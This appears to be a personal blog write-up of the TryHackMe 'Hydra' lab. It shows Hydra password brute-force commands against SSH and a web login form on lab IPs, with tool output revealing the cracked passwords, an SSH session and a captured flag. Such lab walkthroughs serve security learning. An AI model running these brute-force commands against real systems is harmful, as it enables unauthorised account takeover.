---
title: tryhackme room "Hydra" solving experience 
date: 2025-10-01 00:00:00 +0600
categories: [Hacking, Tryhackme]
tags: [tryhackme, hacking, hydra, red team]     # TAG names should always be lowercase
description: "tryhackme room Hydra solving experience and tutorial note"
math: true
---
# Hydra
The hydra room in tryhackme is geared to the basic introduction to hydra. This is where we learn what is hydra, what is it used for, how to use it and a practice use of it as well.

## What is hydra
Hydra is an attacking software that attacks a network with username and passwordlist to log in to that account. 

## Tasks
We are given an IP address which has a web front and an ssh front. We are given with example of how to attack both front with hydra. to attack an ssh server,
```bash
hydra -l <username> -P <full path to pass> 10.201.37.93 -t 4 ssh
```
We then have to change the username and wordlist and the ip address for the ssh as well. But for the web front we have the syntex,
```bash
hydra -l <username> -P <wordlist> 10.201.37.93 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
### SSH
for ssh connecting we use the given syntex with the fact the username is `molly` and attack the given address.
```bash
└╼sadman$hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.52.213 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 19:43:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.201.52.213:22/
[22][ssh] host: 10.201.52.213   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 19:43:34
┌[parrot]─[19:43-01/10]─[/home/sadman]
└╼sadman$
```
we get the ssh login password and then we log in to ssh 
```bash
sadman$ssh molly@10.201.52.213
molly@10.201.52.213's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 01 Oct 2025 01:45:45 PM UTC

  System load:  0.02               Processes:             108
  Usage of /:   18.3% of 14.47GB   Users logged in:       0
  Memory usage: 19%                IPv4 address for ens5: 10.201.52.213
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

7 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Oct  1 13:45:46 2025 from 10.17.52.142
molly@ip-10-201-52-213:~$ ls
flag2.txt
molly@ip-10-201-52-213:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
molly@ip-10-201-52-213:~$ exit
logout
Connection to 10.201.52.213 closed.
```
### Web
In this case we have to use burpsuite so we can find how the login data is sent. So we open burpsuite and open the website with burp browser. And then we intercept the login action. we can find that it is sending a post request to `/login` with the data `username=cat&password=paaaaaaaasssssword` which is evident what username and password I tried. so we know molly user exists. so we can modify the given hydra command.

```bash
sadman$hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.52.213 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 19:59:25
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.201.52.213:80/login:username=^USER^&password=^PASS^:Your username or password is incorrect
[80][http-post-form] host: 10.201.52.213   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 19:59:35
```
so we get the flag by logging in the site with the password.

Hydra cheat sheet [https://pentesting.site/cheat-sheets/hydra/](https://pentesting.site/cheat-sheets/hydra/)